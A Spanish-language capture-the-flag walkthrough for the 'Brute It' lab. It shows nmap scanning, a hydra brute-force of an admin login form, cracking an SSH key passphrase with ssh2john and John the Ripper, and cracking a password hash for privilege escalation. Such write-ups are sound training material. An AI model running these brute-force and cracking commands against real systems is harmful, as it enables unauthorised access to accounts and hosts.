# Brute It

## Scanning
```bash
sudo nmap -sS -p- --min-rate 5000 -vvv --open -Pn -n 10.10.106.96 -oG allports
nmap -sC -sV -p 22,80 10.10.106.96 -oN targeted
```
![0712150305.png](0712150305.png)

## 80

![0712160430.png](0712160430.png)

Encontramos un enlace en la ruta `/admin`, donde tenemos un panel de administración.

![0712160449.png](0712160449.png)

Si vemos en el código fuente encontramos el usuario.

![0712170502.png](0712170502.png)

Podemos usar hydra para encontrar la contraseña.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -V 10.10.106.96 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

![0712160451.png](0712160451.png)

## User Flag

En la página encontramos una flag y un **rsa private key** para descargar. Nos piden realizar fuerza bruta al rsa así que usamos una funcionalidad en parrot llamada ssh2john.

```bash
python2 /usr/share/john/ssh2john.py id_rsa> rsajohn
```

Con eso podemos usar john the ripper para crackear la contraseña.

![0712170541.png](0712170541.png)

Ahora podremos entrar por ssh (con el usuario john)

```bash
sudo ssh john@10.10.106.96 -i id_rsa
```

![0712170552.png](0712170552.png)

## Escala de privilegios

Buscamos si tenemos algún permiso como sudo.

```bash
sudo -l
```

![0712170522.png](0712170522.png)

Ahora con el hash lo guardamos en un archivo en nuestra computadora y usamos john para crackear la contraseña.

```bash
john password --wordlist=/usr/share/wordlists/rockyou.txt
```

![0712170554.png](0712170554.png)

Lo probamos en la consola del otro lado.

![0712170524.png](0712170524.png)